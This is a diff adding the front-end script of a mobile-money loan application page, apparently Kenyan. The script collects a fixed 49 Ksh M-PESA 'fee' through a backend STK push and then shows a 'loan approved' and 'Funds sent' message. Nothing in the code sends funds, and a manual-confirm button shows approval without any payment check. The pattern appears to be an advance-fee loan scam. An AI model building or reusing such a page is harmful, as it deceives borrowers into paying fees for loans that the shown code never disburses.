+        document.getElementById('summaryPage').classList.add('hidden'); 
+        document.getElementById(page).classList.remove('hidden'); 
+        const homeBtn = document.querySelector('.nav-btn[data-page="home"]'); 
+        const applyBtn = document.querySelector('.nav-btn[data-page="apply"]'); 
+        if (page === 'homePage') { 
+            homeBtn.classList.add('active'); 
+            applyBtn.classList.remove('active');
+            document.getElementById('fabApplyBtn').classList.remove('hide-fab');
+        } else { 
+            homeBtn.classList.remove('active'); 
+            applyBtn.classList.add('active');
+            document.getElementById('fabApplyBtn').classList.add('hide-fab');
+        } 
+    }
+    function hideOverlays() { document.querySelectorAll('.overlay').forEach(el => el.classList.add('hidden')); }
+    document.getElementById('editBackBtn').addEventListener('click', () => showPage('applyPage'));
+    document.getElementById('finalSubmitBtn').addEventListener('click', () => { document.getElementById('feePrincipal').innerText = `Ksh ${appState.selectedLoan.toLocaleString()}`; document.getElementById('confirmPaymentOverlay').classList.remove('hidden'); });
+    document.getElementById('cancelPaymentBtn').addEventListener('click', () => document.getElementById('confirmPaymentOverlay').classList.add('hidden'));
+    document.getElementById('payNowBtn').addEventListener('click', () => { document.getElementById('confirmPaymentOverlay').classList.add('hidden'); document.getElementById('stkOverlay').classList.remove('hidden'); let raw = appState.phone.replace(/^254/, ''); if(raw.startsWith('0')) raw = raw.slice(1); document.getElementById('stkPhone').value = raw; });
+    document.getElementById('cancelStkBtn').addEventListener('click', () => document.getElementById('stkOverlay').classList.add('hidden'));
+    document.getElementById('sendStkBtn').addEventListener('click', async () => { 
+        let phoneRaw = document.getElementById('stkPhone').value.trim(); 
+        if (!phoneRaw) { alert('Enter M-PESA number'); return; } 
+        let finalPhone; 
+        try { finalPhone = formatPhoneFlexible(phoneRaw); } catch(e) { alert(e.message); return; } 
+        const btn = document.getElementById('sendStkBtn'); 
+        const original = btn.innerHTML; 
+        btn.disabled = true; 
+        btn.innerHTML = '<span class="small-spinner"></span> Sending...'; 
+        try { 
+            const resp = await fetch(`${BACKEND_URL}/api/initiate`, { 
+                method: 'POST', 
+                headers: { 'Content-Type': 'application/json' }, 
+                body: JSON.stringify({ amount: 49, phone_number: finalPhone }) 
+            });
+            const data = await resp.json();
+            if (!resp.ok || !data.invoice) throw new Error(data.error || 'Payment request failed');
+            const invoiceId = data.invoice.invoice_id;
+            document.getElementById('stkOverlay').classList.add('hidden'); 
+            const waiting = document.getElementById('waitingOverlay'); 
+            waiting.classList.remove('hidden'); 
+            let seconds = 120; 
+            const timerSpan = document.getElementById('timerDisplay'); 
+            timerSpan.innerText = `120 seconds remaining`; 
+            const countdown = setInterval(() => { seconds--; timerSpan.innerText = `${seconds} seconds remaining`; if (seconds <= 0) clearInterval(countdown); }, 1000); 
+            pollTimer = setInterval(async () => {
+                try {
+                    const statusResp = await fetch(`${BACKEND_URL}/api/status/${invoiceId}`);
+                    const statusData = await statusResp.json();
+                    const state = statusData.invoice ? statusData.invoice.state : statusData.state;
+                    if (state === "COMPLETE" || state === "COMPLETED") {
+                        clearInterval(countdown);
+                        clearInterval(pollTimer);
+                        waiting.classList.add('hidden'); 
+                        document.getElementById('successDetails').innerHTML = `<p>${appState.name}, loan approved!</p><p>Amount: Ksh ${appState.selectedLoan.toLocaleString()}</p><p>Monthly: Ksh ${appState.monthly.toLocaleString()} for ${appState.tenureMonths} months</p><p>Funds sent to ${appState.phone}</p>`; 
+                        document.getElementById('successOverlay').classList.remove('hidden'); 
+                    } else if (state === "FAILED" || state === "REJECTED") {
+                        clearInterval(countdown);
+                        clearInterval(pollTimer);
+                        waiting.classList.add('hidden'); 
+                        alert('Payment failed. Please try again.');
+                    }
+                } catch(err) { console.error('Polling error:', err); }
+            }, 3000); 
+            document.getElementById('manualConfirmBtn').onclick = () => { clearInterval(countdown); clearInterval(pollTimer); waiting.classList.add('hidden'); document.getElementById('successDetails').innerHTML = `<p>${appState.name}, loan approved!</p><p>Amount: Ksh ${appState.selectedLoan.toLocaleString()}</p><p>Monthly: Ksh ${appState.monthly.toLocaleString()}</p><p>Funds sent to ${appState.phone}</p>`; document.getElementById('successOverlay').classList.remove('hidden'); }; 
+        } catch(err) { 
+            document.getElementById('stkError').innerText = err.message; 
+            document.getElementById('stkError').classList.remove('hidden'); 
+            btn.disabled = false; 
+            btn.innerHTML = 'Pay Now Via M-pesa'; 
+        } 
+    });
+    document.getElementById('homeResetBtn').addEventListener('click', () => { hideOverlays(); showPage('homePage'); document.getElementById('applicationForm').reset(); appState = {}; });
+    document.getElementById('homeStartBtn').addEventListener('click', () => showPage('applyPage'));
+    document.getElementById('fabApplyBtn').addEventListener('click', () => showPage('applyPage'));
+    document.querySelectorAll('.nav-btn').forEach(btn => btn.addEventListener('click', () => { const page = btn.dataset.page; if (page === 'home') { showPage('homePage'); hideOverlays(); } else { showPage('applyPage'); hideOverlays(); } }));
+    showPage('homePage');
+</script>
+</body>
